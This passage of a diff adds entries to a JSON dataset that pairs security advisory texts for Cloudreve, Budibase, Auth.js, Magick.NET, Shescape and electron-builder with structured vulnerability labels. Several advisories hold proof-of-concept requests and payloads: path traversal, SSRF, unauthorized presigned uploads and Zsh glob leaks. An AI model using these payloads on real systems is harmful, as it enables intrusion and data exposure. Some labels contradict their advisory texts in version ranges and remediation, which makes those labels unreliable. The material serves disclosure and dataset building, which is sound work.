`AUTHORIZATION`, `X-Api-Key`, etc. are all matched. The fix also exports `addSensitiveRedirectHeader()` to allow custom publishers to register additional headers.\n\n**Upgrade path:** Update `builder-util-runtime` to `>= 9.7.0`.\n\n---\n\n## Workarounds\n\nThere is no configuration-level workaround that prevents header forwarding in affected versions. The only mitigation short of upgrading is to avoid authenticated GitLab updater flows on versions `< 9.7.0`.\n\nIf operating in a network environment where you control all possible redirect destinations, you may be able to prevent the token from reaching an attacker-controlled host through network-layer controls, but this is not a reliable mitigation.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-54673",
+          "affected_products": [
+            {
+              "vendor": "NPM",
+              "product": "builder-util-runtime",
+              "version_range": "< 9.7.0"
+            }
+          ],
+          "cwe_category": "Exposure of Sensitive Information to an Unauthorized Actor",
+          "severity": "high",
+          "attack_vector": "unknown",
+          "impact_summary": "An automatic update check can leak GitLab personal access tokens and Bearer/OAuth tokens via a cross-origin redirect vulnerability.",
+          "remediation_action": "Update to a version of electron-builder that includes the fix for HttpExecutor.prepareRedirectUrlOptions."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-49h3-cwhj-4737",
+    "input_text": "## Summary\n \nCloudreve's WOPI `PUT_RELATIVE` handler treats `X-WOPI-SuggestedTarget` as a path, not a filename. It splits the header on `/` and joins the segments onto the source file's directory with `URI.JoinRaw`, which feeds Go's `url.JoinPath`. `url.JoinPath` resolves `.`/`..` segments, so a slash-bearing target such as `a/../../evil.docx` collapses to a location outside the source file's directory. The lower-level upload path then validates only the final, already-cleaned basename (`evil.docx`), which is harmless, and checks ownership against the *resolved ancestor* \u2014 which is still the same user's drive.\n \nA WOPI access token is bound to exactly one file (the route enforces `fileId == session.FileID` with a 403 otherwise). `PUT_RELATIVE` escapes that per-file scope: a token issued for one file can create (and, conditionally, overwrite) files elsewhere in the same account.\n\n## Root cause (verified at `26b6b10`)\n \n**1. Token is single-file scoped (the boundary being escaped)** \u2014 `middleware` `ViewerSessionValidation`:\n \n```go\nfileId := hashid.FromContext(c)\nif fileId != session.FileID {           // 403 \u2014 token is bound to ONE file\n    c.Status(http.StatusForbidden); c.Abort(); return\n}\n```\n \nRoute: `wopi := noAuth.Group(\"file/wopi\", middleware.HashID(hashid.FileID), middleware.ViewerSessionValidation())`; `wopi.POST(\":id\", controllers.ModifyFile)` \u2192 `POST /api/v4/file/wopi/:id?access_token=<token>`.\n \n**2. `PUT_RELATIVE` dispatch** \u2014 `routers/controllers/wopi.go`:\n \n```go\ncase wopi.MethodPutRelative:            // X-WOPI-Override: PUT_RELATIVE\n    err = service.PutContent(c, true)\n```\n \n**3. SuggestedTarget joined as a path** \u2014 `service/explorer/viewer.go`:\n \n```go\nfileName, _ := wopi.UTF7Decode(c.GetHeader(wopi.SuggestedTargetHeader)) // X-WOPI-SuggestedTarget\nfileUriParsed, _ := fs.NewUriFromString(fileUri)\nif strings.HasPrefix(fileName, \".\") { /* treat as extension */ }\nfileUri = fileUriParsed.DirUri().JoinRaw(fileName).String()             // <-- path join, not basename\n...\nsubService := FileUpdateService{ Uri: fileUri }\nres, err := subService.PutContent(c, lockSession)\n```\n \n**4. `JoinRaw` splits on `/` and normalizes via `url.JoinPath`** \u2014 `pkg/filemanager/fs/uri.go`:\n \n```go\nfunc (u *URI) Join(elem ...string) *URI {\n    newUrl, _ := url.Parse(u.U.String())\n    return &URI{U: newUrl.JoinPath(/* PathEscape each elem */ ...)} // JoinPath cleans ./ and ../\n}\nfunc (u *URI) JoinRaw(elem string) *URI {\n    return u.Join(strings.Split(strings.TrimPrefix(elem, Separator), Separator)...)\n}\n```\n \n`PathEscape` leaves `.` unescaped (it is in the unreserved set), so `..` segments survive into `JoinPath`, which resolves them. `URI.Name()` returns `path.Base(path.Clean(path))` \u2014 the cleaned basename.\n \n**5. Upload checks ownership of the resolved ancestor and validates only the clean basename** \u2014 `pkg/filemanager/fs/dbfs/upload.go`:\n \n```go\nancestor, err := f.getFileByPath(ctx, navigator, req.Props.Uri)        // URI already traversal-normalized\n...\nif _, ok := ctx.Value(ByPassOwnerCheckCtxKey{}).(bool); !ok && ancestor.OwnerID() != f.user.ID {\n    return nil, fs.ErrOwnerOnly                                        // same-user -> passes\n}\n...\nif err := validateNewFile(req.Props.Uri.Name(), req.Props.Size, policy); err != nil { // checks \"evil.docx\" only\n    return nil, err\n}\n```\n \n`validateFileName` rejects `/ \\ : * ? \" < > |` and bare `.`/`..` \u2014 but the traversal is already gone by the time it sees the basename.\n\n## Validation performed\n \nIndependent validation against commit `26b6b10` in a clean sandbox.\n \n**Source-verified (static):** the full chain confirmed verbatim \u2014 single-file-scoped token (403 on mismatch) \u2192 `PUT_RELATIVE` dispatch \u2192 `DirUri().JoinRaw(SuggestedTarget)` \u2192 `url.JoinPath` normalization \u2192 ancestor ownership check (same-user passes) \u2192 basename-only validation of the cleaned name.\n \n**Dynamic (control-flow executed):** the full binary is not buildable offline here (modules behind an unreachable Go proxy, embedded frontend, DB). I built and ran a harness using the **real Go `net/url` stdlib** plus the **verbatim** `Join`/`JoinRaw`/`DirUri`/`Path`/`Name`/`PathEscape`/`shouldEscape` and the `validateFileName` gate, driving the same transformation `PUT_RELATIVE` performs. Source = `cloudreve://my/folder/current.docx`:\n \n```\nSuggestedTarget            resolved URI                          final basename   validator\n\"copy.docx\"                cloudreve://my/folder/copy.docx       \"copy.docx\"      ACCEPT\n\"a/../../evil.docx\"        cloudreve://my/evil.docx              \"evil.docx\"      ACCEPT   <- ESCAPED to /\n\"a/../../../top.docx\"      cloudreve://my/top.docx               \"top.docx\"       ACCEPT   <- ESCAPED to /\n\"sub/evil.docx\"            cloudreve://my/folder/sub/evil.docx   \"evil.docx\"      ACCEPT   <- different subdir\n\".pdf\"                     cloudreve://my/folder/current.pdf     \"current.pdf\"    ACCEPT\n\"a%2f..%2f..%2fenc.docx\"   cloudreve://my/folder/a%252f..%252f.. \"a%2f..%2f..%2f\" ACCEPT   (NO escape)\n```\n \nThe headline payload `a/../../evil.docx` deterministically resolves to `cloudreve://my/evil.docx` (account root) with a clean, accepted basename. Output matches the original audit probe exactly. Honest caveat: a leading non-`..` segment (e.g. `a/`) is required to prime the join; a single `../evil.docx` does not cleanly escape, and **URL-encoded separators (`%2f`) do not traverse** through this path (they are re-escaped into one literal segment). Only literal `/` separators work.\n \n**Confidence tier: source-verified + control-flow dynamically reproduced (no full live HTTP write against a deployed instance).**\n \n**Deduplication:** no existing CVE/GHSA matches. Known Cloudreve advisories are CVE-2022-32167 (XSS, v1\u2013v3.5.3) and CVE-2026-25726 (weak-PRNG ATO, instances initialized < v4.10.0) \u2014 both unrelated. `SECURITY.md` lists \"user permissions\" as high-impact and in scope for all 4.x, so this qualifies as a vulnerability under the project's own policy.\n \n## Steps to reproduce\n \n**Setup:** user owns `cloudreve://my/folder/current.docx`; open it in the WOPI editor to obtain `<token>` (the session is bound to that file's ID).\n \n1. Send the crafted `PUT_RELATIVE`:\n   ```\n   POST /api/v4/file/wopi/<file-id>?access_token=<token> HTTP/1.1\n   Host: target\n   X-WOPI-Override: PUT_RELATIVE\n   X-WOPI-SuggestedTarget: <UTF-7 of \"a/../../evil.docx\">\n   Content-Type: application/octet-stream\n \n   <file bytes>\n   ```\n2. Cloudreve rewrites the target from `cloudreve://my/folder/current.docx` to `cloudreve://my/evil.docx`, validates the basename `evil.docx` (passes), and writes the content.\n**Expected:** the target is rejected or constrained to the source file's directory.\n**Actual:** a file is written at the account root, outside the token's single-file scope.\n \n## Impact\n \nA WOPI access token scoped to one file can write files to other locations in the same user's account. A malicious or compromised WOPI integration (or a leaked token) can plant or, conditionally, overwrite files at attacker-chosen paths the account owns, defeating the per-file scoping the WOPI session is meant to enforce. Confined to the session user's account (not cross-user).\n \n## Remediation\n \n- Treat `X-WOPI-SuggestedTarget` (and `X-WOPI-RequestedName`) as a **filename**, not a path: reject `/`, `\\`, dot segments, and percent-encoded separator variants before joining.\n- Prefer `DirUri().Join(sanitizedBaseName)` over `JoinRaw`, and after constructing the target URI assert it is a direct child of the source file's directory.\n- Add regression tests for `a/../../evil.docx`, `sub/evil.docx`, and encoded-separator variants.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": "CVE-2026-55495",
+          "affected_products": [
+            {
+              "vendor": "GO",
+              "product": "github.com/cloudreve/Cloudreve/v3",
+              "version_range": "<= 3.0.0-20250225100611-da4e44b77af4"
+            },
+            {
+              "vendor": "GO",
+              "product": "github.com/cloudreve/Cloudreve/v4",
+              "version_range": "< 4.0.0-20260613023150-7968e50429ef"
+            }
+          ],
+          "cwe_category": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
+          "severity": "medium",
+          "attack_vector": "network",
+          "impact_summary": "Unauthorized file creation and modification across different files within the same user's account, due to improper handling of relative paths and lack of proper permission checks.",
+          "remediation_action": "Implement stricter path validation and ownership checks to prevent unauthorized file operations."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-6vxp-gfwf-hcr9",
+    "input_text": "When a temporary file can not be created a small memory leak will happen in the TIFF encoder.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-HDRI-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-x86",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-OpenMP-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-OpenMP-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-AnyCPU",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-x86",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-arm64",
+              "version_range": "< 14.15.0"
+            }
+          ],
+          "cwe_category": "Missing Release of Memory after Effective Lifetime",
+          "severity": "low",
+          "attack_vector": "local",
+          "impact_summary": "A small memory leak can occur due to a failed temporary file creation in the TIFF encoder.",
+          "remediation_action": "Ensure proper error handling and resource management to prevent the failure of creating temporary files."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-xcx6-4f2g-hhgx",
+    "input_text": "## Impact\n\nIn Budibase v3.39.4, a regression in the authorization level for the S3 attachment upload endpoint allows any BASIC app user to obtain S3 PutObject presigned URLs. The endpoint uses TABLE/WRITE permission level instead of the intended BUILDER level defined in v3.39.3. Additionally, the controller does not pin the target bucket to the datasource's configured bucket, allowing writes to any S3 bucket the stored IAM credentials can access.\n\n## Reproduction\n\n1. As a BASIC app user, discover or obtain a valid S3 datasource ID within the app\n2. Send a POST request:\n\n```\nPOST /api/attachments/<datasourceId>/url\nContent-Type: application/json\nx-budibase-app-id: <appId>\n\n{\"bucket\": \"target-bucket\", \"key\": \"malicious-file.html\"}\n```\n\n3. The response contains a valid S3 PutObject presigned URL\n4. Use the presigned URL to upload arbitrary content to any writable S3 bucket in the IAM credential scope\n\n## Root Cause\n\nThe `/api/attachments/:datasourceId/url` route was changed from `authorized(BUILDER)` in v3.39.3 to `authorized(PermissionType.TABLE, PermissionLevel.WRITE)` in v3.39.4. BASIC users have TABLE/WRITE permissions by default, so they can call this endpoint. The controller at `packages/server/src/api/controllers/static/index.ts:614-632` accepts the `bucket` parameter directly from the request body and passes it to `getSignedUrl` without validating against the datasource's configured bucket.\n\n## Evidence\n\nThe test suite at `packages/server/src/api/routes/tests/static.spec.ts:218-235` confirms this behavior. The test authenticates as a BASIC role user and successfully generates a signed upload URL, verifying HTTP 200 and a defined `res.body.signedUrl`.\n\n## Remediation\n\n1. Restore the `authorized(BUILDER)` middleware on the route\n2. Add `paramResource(\"datasourceId\")` to ensure the datasource belongs to the caller's app\n3. Pin the S3 bucket to `datasource.config.bucket` in the controller, ignoring the caller-supplied bucket value",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "NPM",
+              "product": "@budibase/server",
+              "version_range": "<= 3.38.1"
+            }
+          ],
+          "cwe_category": "Incorrect Authorization",
+          "severity": "high",
+          "attack_vector": "network",
+          "impact_summary": "Any BASIC app user can obtain S3 PutObject presigned URLs and write to any writable S3 bucket.",
+          "remediation_action": "Restore the `authorized(BUILDER)` middleware on the route and pin the S3 bucket to `datasource.config.bucket` in the controller."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-x445-f3h2-j279",
+    "input_text": "## Summary\n\nAuth.js stores the OAuth/OIDC anti-CSRF checks (`state`, `nonce`, and the PKCE verifier) in global cookies that are not bound to the provider that created them. On callback, a check value minted during a sign-in started with one provider can satisfy the callback for a different provider, because the stored cookie is not verified against the callback provider's identity (provider id, issuer, client id, or redirect URI). In a multi-provider app that allows account linking while logged in, this provider-confusion / mix-up condition can let an attacker link their account at a second provider to a victim's user.\n\n## Am I affected?\n\nYou may be affected if **all** of the following hold:\n\n- You use `next-auth` `<= 4.24.14` or `>= 5.0.0-beta.1, <= 5.0.0-beta.31`, or `@auth/core` `<= 0.41.2`.\n- You configure multiple OAuth/OIDC providers.\n- You allow users to link additional providers while logged in.\n- At least one configured provider's authorization request is observable by an attacker, and at least one target provider's callback can be satisfied without a PKCE verifier (i.e. it relies only on `state` or only on `nonce`).\n\nYou are **not** affected if you use a single OAuth provider, do not allow logged-in account linking, or all providers enforce PKCE.\n\n## Impact\n\n- Account-linking confusion: an attacker can get their account at a target provider linked to the victim's Auth.js user, granting the attacker persistent sign-in to the victim's account through that linked provider.\n- Exploitation requires luring the victim into starting a legitimate same-origin flow; it cannot be performed by cross-site request forgery alone, which reduces practical likelihood.\n\n## Patched version\n\nThe fix binds the OAuth check cookies to the provider/authorization flow that created them, so a callback cannot consume a check value minted for a different provider. Upgrade to the first releases containing this fix (pending; this advisory will be updated with exact patched versions before publication).\n\n## Workarounds\n\nIf you cannot upgrade immediately:\n\n- Enable PKCE (`checks: [\"pkce\"]`, in addition to `state`/`nonce`) on every provider that supports it; PKCE blocks the practical code-swap variant because the attacker cannot observe the relying party's verifier.\n- Avoid offering logged-in account linking across multiple providers where one provider is lower-trust or attacker-observable.\n- Treat `events.linkAccount` as sensitive: add audit logging, user notification, or out-of-band confirmation so that any unexpected link is visible (defense-in-depth, not a root-cause fix).\n\n## Credit\n\nReported by @Nadav0077. Thank you for the responsible disclosure.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "NPM",
+              "product": "next-auth",
+              "version_range": "<= 4.24.14"
+            },
+            {
+              "vendor": "NPM",
+              "product": "next-auth",
+              "version_range": ">= 5.0.0-beta.1, <= 5.0.0-beta.31"
+            },
+            {
+              "vendor": "NPM",
+              "product": "@auth/core",
+              "version_range": "<= 0.41.2"
+            }
+          ],
+          "cwe_category": "Insufficient Verification of Data Authenticity",
+          "severity": "medium",
+          "attack_vector": "network",
+          "impact_summary": "Auth.js: OAuth state, nonce, and PKCE check cookies are not bound to the provider that created them",
+          "remediation_action": null
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-v6w6-358x-2433",
+    "input_text": "## Summary\n\nCloudreve exposes two admin node test endpoints under the `Admin.Read` OAuth scope. These endpoints accept attacker-controlled node definitions and cause Cloudreve to make outbound server-side network requests. This allows an OAuth client authorized only for `Admin.Read` to trigger operational network actions that should require `Admin.Write`.\n\n## Impact\n\nAn attacker who obtains an admin-authorized OAuth token with `Admin.Read` but not `Admin.Write` can make the Cloudreve server connect to arbitrary URLs supplied in the request body. This can be used for blind SSRF, internal service probing, and triggering signed Cloudreve slave-style requests to attacker-chosen endpoints.\n\n## Affected version\n\nVerified in source and runtime on latest master commit `ba2e870bbd17f1918dd2321de861e453f696d6a3` and latest observed tag `4.16.1`.\n\n## Technical details\n\nThe authenticated admin route group requires only `Admin.Read`:\n\n```go\nauth := v4.Group(\"\")\nauth.Use(middleware.LoginRequired())\nauth.Use(middleware.RequiredScopes(types.ScopeAdminRead))\nadmin := auth.Group(\"admin\", middleware.IsAdmin())\n```\n\nThe following routes are registered without `ScopeAdminWrite`:\n\n```go\nnode.POST(\"test\",\n    controllers.FromJSON[adminsvc.TestNodeService](adminsvc.TestNodeParamCtx{}),\n    controllers.AdminTestSlave,\n)\nnode.POST(\"test/downloader\",\n    controllers.FromJSON[adminsvc.TestNodeDownloaderService](adminsvc.TestNodeDownloaderParamCtx{}),\n    controllers.AdminTestDownloader,\n)\n```\n\nBy contrast, node create, update, and delete routes do require `Admin.Write`:\n\n```go\nnode.PUT(\"\", middleware.RequiredScopes(types.ScopeAdminWrite), ...)\nnode.PUT(\":id\", middleware.RequiredScopes(types.ScopeAdminWrite), ...)\nnode.DELETE(\":id\", middleware.RequiredScopes(types.ScopeAdminWrite), ...)\n```\n\n`TestNodeService.Test()` parses the attacker-supplied node server and sends a request to it:\n\n```go\nslave, err := url.Parse(service.Node.Server)\n...\nres, err := r.Request(\n    \"POST\",\n    routes.SlavePingRoute(slave),\n    bytes.NewReader(bodyByte),\n    ...\n)\n```\n\n`TestNodeDownloaderService.Test()` constructs a downloader from attacker-supplied node settings and invokes its network test method.\n\n## Reproduction\n\nThe following was verified against a disposable Cloudreve instance built from the affected commit.\n\nPrerequisite: an admin user authorizes an OAuth client with `Admin.Read` but not `Admin.Write`.\n\n1. Obtain an OAuth access token whose scope is only:\n\n```text\nopenid Admin.Read\n```\n\nThe returned token response contains:\n\n```json\n{\n  \"token_type\": \"Bearer\",\n  \"scope\": \"openid Admin.Read\"\n}\n```\n\n2. Confirm the token cannot perform an `Admin.Write` node operation:\n\n```http\nPUT /api/v4/admin/node HTTP/1.1\nAuthorization: Bearer <admin-read-oauth-token>\nContent-Type: application/json\n\n{\n  \"node\": {\n    \"name\": \"deny-control\",\n    \"server\": \"http://127.0.0.1:18080\",\n    \"type\": \"slave\",\n    \"slave_key\": \"poc\"\n  }\n}\n```\n\nObserved response:\n\n```json\n{\n  \"code\": 40089,\n  \"msg\": \"Insufficient scope: Admin.Write\"\n}\n```\n\n3. Use the same `Admin.Read`-only OAuth token to call the node test endpoint with an attacker-controlled server URL:\n\n```http\nPOST /api/v4/admin/node/test HTTP/1.1\nAuthorization: Bearer <admin-read-oauth-token>\nContent-Type: application/json\n\n{\n  \"node\": {\n    \"id\": 124,\n    \"name\": \"ssrf-poc\",\n    \"server\": \"http://127.0.0.1:18080\",\n    \"type\": \"slave\",\n    \"slave_key\": \"attacker-controlled-key\"\n  }\n}\n```\n\nObserved Cloudreve response:\n\n```json\n{\n  \"code\": 0,\n  \"msg\": \"\"\n}\n```\n\n4. The canary server at `127.0.0.1:18080` received the backend request:\n\n```http\nPOST /api/v4/slave/ping HTTP/1.1\nHost: 127.0.0.1:18080\nUser-Agent: Cloudreve/4.14.0\nAuthorization: Bearer Cr <hmac-signature>:<timestamp>\nX-Cr-Node-Id: 124\nX-Cr-Site-Url: http://127.0.0.1:15212\nContent-Length: 37\n\n{\"callback\":\"http://127.0.0.1:15212\"}\n```\n\nThis proves the `Admin.Read`-only OAuth token is denied on a sibling `Admin.Write` route but can still trigger a server-side request to an attacker-selected node URL through the test route.\n\n## Root cause\n\nThe route group enforces `Admin.Read` by default and relies on per-route `Admin.Write` middleware for operations that mutate state or perform operational side effects. The node test endpoints were omitted from the `Admin.Write` set even though they execute server-side network actions using attacker-supplied configuration.\n\n## Remediation\n\n- Add `middleware.RequiredScopes(types.ScopeAdminWrite)` to both node test routes.\n- Consider applying SSRF validation or network egress controls to all admin-supplied test URLs.\n- Audit other admin test endpoints for read-scoped side effects.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "GO",
+              "product": "github.com/cloudreve/Cloudreve/v3",
+              "version_range": "<= 3.0.0-20250225100611-da4e44b77af4"
+            },
+            {
+              "vendor": "GO",
+              "product": "github.com/cloudreve/Cloudreve/v4",
+              "version_range": "< 4.0.0-20260626022735-332a9d800205"
+            }
+          ],
+          "cwe_category": "Incorrect Authorization",
+          "severity": "medium",
+          "attack_vector": "network",
+          "impact_summary": "An attacker with only Admin.Read scope can trigger network requests to arbitrary URLs.",
+          "remediation_action": "Update OAuth scopes of clients to include Admin.Write for affected routes."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-v3j6-27vc-7pw2",
+    "input_text": "Due to a missing check in the APNG encoder and external delegates it is possibly to bypass the policy and write to a disallowed path.",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-HDRI-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-x86",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-OpenMP-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-OpenMP-arm64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q8-AnyCPU",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-x86",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-x64",
+              "version_range": "< 14.15.0"
+            },
+            {
+              "vendor": "NUGET",
+              "product": "Magick.NET-Q16-arm64",
+              "version_range": "< 14.15.0"
+            }
+          ],
+          "cwe_category": "Improper Link Resolution Before File Access ('Link Following')",
+          "severity": "low",
+          "attack_vector": "local",
+          "impact_summary": "Bypassing a policy to write to a disallowed path via a missing check in APNG encoder.",
+          "remediation_action": "Apply a fix for the missing check and ensure proper validation of paths used by the external delegates."
+        }
+      ]
+    }
+  },
+  {
+    "source_ghsa_id": "GHSA-6v4m-fw66-8r4x",
+    "input_text": "### Impact\n\nThis impacts users of Shescape on Unix systems that explicitly configure `shell` to Zsh, or `true` when the default shell is Zsh, using the `escape` and `escapeAll`. The Zsh options `EXTENDED_GLOB` and `MAGIC_EQUAL_SUBST` exacerbate the problem.\n\nIn certain case, an attacker can leverage home directory expansion and extended glob syntax to obtain lists of files and directories on the system. Depending on what the command does, this may be used to leak more information.\n\n#### Without option / with `MAGIC_EQUAL_SUBST`\n\n```javascript\nimport * as cp from \"node:child_process\";\nimport { Shescape } from \"shescape\";\n\n// 1. Prerequisites\nconst options = {\n    shell: \"zsh\",\n    // Or\n    shell: true, // Only if the default shell is Zsh\n};\n\n// 2. Payload\nconst payload1 = \":~\";\n// Or\nconst payload2 = \"a=~\"; // requires MAGIC_EQUAL_SUBST\n\n// 3. Usage\nconst shescape = new Shescape(options);\nlet escapedPayload;\n\nescapedPayload = shescape.escape(payload1);\n// Or\nescapedPayload = shescape.escapeAll([payload1]);\n// And (example)\nconst result1 = cp.execSync(`V=${escapedPayload}; echo $V`, options);\n\n// Or\nescapedPayload = shescape.escape(payload2);\n// Or\nescapedPayload = shescape.escapeAll([payload2]);\n// And (example)\nconst result2 = cp.execSync(`echo ${escapedPayload}`, options);\n\n// 4. Impact\nconsole.log(\"\", result1.toString().trim(), \"\\n\", result2.toString().trim());\n// Outputs \":\" followed by the user's home directory on one line and \"a=\"\n// followed by the user's home directory (under MAGIC_EQUAL_SUBST) on the next.\n```\n\n#### With `EXTENDED_GLOB`\n\n```javascript\nimport * as cp from \"node:child_process\";\nimport { Shescape } from \"shescape\";\n\n// 1. Prerequisites\nconst options = {\n    shell: \"zsh\",\n    // Or\n    shell: true, // Only if the default shell is Zsh\n};\n\n// And (example)\n// `setopt EXTENDED_GLOB` in ~/.zshenv\n\n// 2. Payload\nlet payload;\n\npayload = \"pa#ckage.json\";\n// Or\npayload = \"^package.json~package-lock.json\";\n// Or\npayload = \"^nonexistent\";\n\n// 3. Usage\nconst shescape = new Shescape(options);\nlet escapedPayload;\n\nescapedPayload = shescape.escape(payload);\n// Or\nescapedPayload = shescape.escapeAll([payload]);\n\n// And (example)\nconst result = cp.execSync(`echo ${escapedPayload}`, options);\n\n// 4. Impact\nconsole.log(result.toString());\n// Outputs files and directories in the current directory\n```\n\n### Patches\n\nThis bug has been patched in [v2.1.14] and [v3.0.1] which you can upgrade to now.\n\nIf you are already using v3 of Shescape, no further changes are required. If you are using v2 of Shescape it is recommended to upgrade as this version reaches end-of-life status on 2026-09-28, follow the [migration guide] to upgrade to v3.\n\nNo patches will be released for version of Shescape lower than v2.0.0.\n\n### Workarounds\n\nAlternatively, users of Shescape can 1) refrain from using Zsh, 2) ensure the `EXTENDED_GLOB` option is disabled, 3) remove all instances of `^`, `#`, and `~` from untrusted inputs.\n\n### For more information\n\n- Comment on Pull Request [#2651] for v2 and [#2649] for v3\n- Comment on commit [b4b34c3] for v2 and [43d70b5] for v3\n- Open an issue at <https://github.com/ericcornelissen/shescape/issues> (New issue > Question)",
+    "label": {
+      "vulnerabilities": [
+        {
+          "cve_id": null,
+          "affected_products": [
+            {
+              "vendor": "NPM",
+              "product": "shescape",
+              "version_range": ">= 3.0.0, < 3.0.1"
+            },
+            {
+              "vendor": "NPM",
+              "product": "shescape",
+              "version_range": "< 2.1.14"
+            }
+          ],
+          "cwe_category": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
+          "severity": "medium",
+          "attack_vector": "unknown",
+          "impact_summary": "An attacker can leverage home directory expansion and extended glob syntax to obtain lists of files and directories on the system.",
+          "remediation_action": "Users are recommended to upgrade to Shescape v3.0.1, refrain from using Zsh, or ensure the `EXTENDED_GLOB` option is disabled."
+        }
+      ]
+    }
+  }
+]
